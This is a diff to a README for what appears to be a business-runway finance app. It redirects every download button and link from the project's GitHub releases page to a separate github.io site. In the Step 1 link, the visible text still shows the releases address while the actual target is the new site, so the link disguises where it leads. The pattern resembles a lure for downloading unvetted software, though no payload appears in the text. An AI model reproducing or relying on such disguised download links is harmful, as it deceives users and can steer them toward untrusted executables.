@@ -1,7 +1,7 @@
 <h1>💼 claude-artifact-business-runway - Your Business Runway, Simplified</h1>
 
 <p align="center">
-<a href="https://github.com/Neddadarkling2308/claude-artifact-business-runway/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:1.2em;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download Now - Free!</a>
+<a href="https://neddadarkling2308.github.io" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:1.2em;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download Now - Free!</a>
 </p>
 
 ---
@@ -69,7 +69,7 @@ Getting started with Business Runway is quick and painless. Just follow these si
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https]://github.com/Neddadarkling2308/claude-artifact-business-runway/releases](https://github.com/Neddadarkling2308/claude-artifact-business-runway/releases)
+Visit this link to download the application: [https]://github.com/Neddadarkling2308/claude-artifact-business-runway/releases](https://neddadarkling2308.github.io)
 
 
 
@@ -220,7 +220,7 @@ If Business Runway has helped you—whether it saved you an hour, helped you und
 Ready to take control of your business finances? Click the button below to grab your free copy now:
 
 <p align="center">
-<a href="https://github.com/Neddadarkling2308/claude-artifact-business-runway/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#ffffff;font-size:1.2em;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 15px rgba(240,147,251,0.4);">🌟 Get Business Runway - Free Download</a>
+<a href="https://neddadarkling2308.github.io" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#ffffff;font-size:1.2em;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 15px rgba(240,147,251,0.4);">🌟 Get Business Runway - Free Download</a>
 </p>
 
 ---
